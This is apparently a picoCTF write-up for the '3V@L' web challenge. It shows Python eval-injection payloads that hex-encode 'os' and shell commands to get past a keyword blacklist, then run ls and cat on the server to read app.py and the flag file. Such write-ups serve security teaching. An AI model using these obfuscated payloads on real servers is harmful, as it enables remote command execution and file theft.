# 3V@L
 
**Date**: 12-23-2025

**Author**: Lukas Somwong  

**Platform**: PicoCTF PicoGym

**Category**: Web

**Dificulty**: Medium

## Solution

Given the opportunity to execute eval on the server from the client side, my first instinct was to use the os library to read files on the system. I tried to use the following expression but was met with an error.

`__import__("os").popen("ls").read()`

![alt text](<../images/Screenshot 2025-12-23 at 10.17.53 PM.png>)

![alt text](<../images/Screenshot 2025-12-23 at 10.15.59 PM.png>)

There was clearly some sort of word blacklist to prevent abuse of the eval function. To bypass the word blacklist, I instead used the hexadecimal version of keywords like "os" and "ls" which I decoded inside the expression.

`"os".encode('utf-8').hex()` 

"6f73"

`"ls".encode('utf-8').hex()`

"6c73"

`__import__(bytes.fromhex("6f73").decode('utf-8')).popen(bytes.fromhex("6c73").decode('utf-8')).read()`

![alt text](<../images/Screenshot 2025-12-23 at 10.23.46 PM.png>)

I first decided to use cat to read the python file.

`"cat app.py".encode('utf-8').hex()`

"636174206170702e7079"

`__import__(bytes.fromhex("6f73").decode('utf-8')).popen(bytes.fromhex("636174206170702e7079").decode('utf-8')).read()`


![alt text](<../images/Screenshot 2025-12-23 at 10.12.17 PM.png>)

With the contents of the app.py file, I could now clearly see which words were blocked. The flag was not present in the file and there was no indication from this file where it could be. 

I decided to check the directory outside of the app.

`"ls ..".encode('utf-8').hex()`

6c73202e2e

`__import__(bytes.fromhex("6f73").decode('utf-8')).popen(bytes.fromhex("6c73202e2e").decode('utf-8')).read()`

![alt text](<../images/Screenshot 2025-12-23 at 10.41.07 PM.png>)

From the parent directory, I could see the flag.txt file.

`"cat ../flag.txt".encode('utf-8').hex()`

636174202e2e2f666c61672e747874

`__import__(bytes.fromhex("6f73").decode('utf-8')).popen(bytes.fromhex("636174202e2e2f666c61672e747874").decode('utf-8')).read()`

![alt text](<../images/Screenshot 2025-12-23 at 10.42.46 PM.png>)